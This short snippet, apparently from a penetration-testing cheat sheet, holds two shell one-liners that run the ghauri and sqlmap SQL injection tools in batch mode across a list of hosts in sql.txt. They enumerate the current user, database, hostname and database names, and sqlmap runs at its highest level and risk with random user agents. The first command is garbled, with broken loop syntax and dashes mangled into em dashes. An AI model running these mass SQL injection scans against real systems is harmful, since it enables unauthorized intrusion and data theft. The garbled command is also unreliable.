at sql.txt | while read host do;do ghauri -u $host — batch — level=3. -b — current-user — current-db — hostname — dbs ;done
sqlmap -m sql.txt --batch --random-agent --level 5 --risk 3
